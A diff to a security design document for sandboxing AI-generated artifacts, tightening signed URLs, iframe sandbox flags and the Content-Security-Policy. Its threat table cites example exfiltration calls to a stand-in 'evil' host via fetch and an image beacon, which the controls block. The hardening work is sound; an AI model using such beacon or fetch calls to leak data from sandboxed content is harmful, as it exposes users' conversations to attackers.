@@ -21,8 +21,12 @@ exfiltrate conversations and phish the owner.
 ## Hosting
 
 - Content is stored by artifact ID (content-addressed or random).
-- URLs are unguessable and, where possible, signed and short-lived.
+- URLs are unguessable and signed: `/a/<id>?exp=<unix-seconds>&sig=<hmac>`,
+  HMAC-SHA256 over `id` and `exp` with `ARTIFACT_SIGNING_KEY`, TTL ≤ 15 minutes.
+- The signature is validated before any bytes are served; expired URLs return
+  403 and the app requests a fresh one.
 - The host is a separate process/container with a read-only filesystem.
+- It sets no cookies and accepts no session or Basic credentials.
 - It has no network route to OpenCode or the workspace.
 - Egress is limited to an allowlist (or disabled).
 
@@ -30,8 +34,8 @@ exfiltrate conversations and phish the owner.
 
 ```html
 <iframe
-  src="https://artifacts.example.com/a/<id>?token=<signed>"
-  sandbox="allow-scripts allow-forms allow-modals allow-popups"
+  src="https://artifacts.example.com/a/<id>?exp=<unix>&sig=<hmac>"
+  sandbox="allow-scripts allow-modals allow-popups"
   referrerpolicy="no-referrer"
   loading="lazy"
   title="Artifact preview"
@@ -40,6 +44,7 @@ exfiltrate conversations and phish the owner.
 
 - `allow-scripts` is required for interactive artifacts.
 - `allow-same-origin` is forbidden with `allow-scripts`.
+- `allow-forms` is omitted because the artifact CSP sets `form-action 'none'`.
 - `allow-top-navigation` is forbidden.
 - `allow-popups-to-escape-sandbox` is forbidden.
 - The parent listens to `postMessage` with an origin check and a narrow message
@@ -52,22 +57,25 @@ Content-Security-Policy:
   default-src 'none';
   script-src 'unsafe-inline' 'unsafe-eval';
   style-src 'unsafe-inline';
-  img-src data: blob: https:;
+  img-src data: blob:;
   font-src data:;
   connect-src 'none';
   frame-src 'none';
   base-uri 'none';
   form-action 'none';
+  frame-ancestors https://chat.example.com;
 ```
 
 Notes:
 
 - `unsafe-inline`/`unsafe-eval` are acceptable only inside the isolated origin;
   they are not acceptable on the app origin.
-- `connect-src 'none'` blocks exfiltration. If an artifact needs network access,
-  add an explicit allowlist per artifact and document it.
-- `img-src https:` allows remote images; tighten to a proxy if needed.
-- `frame-ancestors` must allow only the app origin.
+- Exfiltration is blocked by `connect-src 'none'` **and** by allowing no remote
+  image source. `img-src https:` would reopen a channel through
+  `new Image().src`; if an artifact needs remote images, proxy them through the
+  artifact host.
+- If an artifact needs network access, add an explicit per-artifact allowlist
+  and document the threat model; never enable it globally.
 
 ## React and build artifacts
 
@@ -85,7 +93,7 @@ Notes:
 | API access | no same-origin, CORS deny | `fetch('/api/...')` fails |
 | Top navigation | no `allow-top-navigation` | `window.top.location` blocked |
 | Popup phishing | no escape-sandbox | popup has opaque origin |
-| Data exfiltration | `connect-src 'none'` | `fetch('https://evil')` blocked |
+| Data exfiltration | `connect-src 'none'` + no remote image source | `fetch('https://evil')` and `new Image().src='https://evil'` both blocked |
 | Parent DOM access | sandbox | `parent.document` throws |
 | Malicious download | `Content-Disposition: attachment` | download requires user action |
 | Resource exhaustion | timeouts, CPU/memory limits | runaway loop is killed |
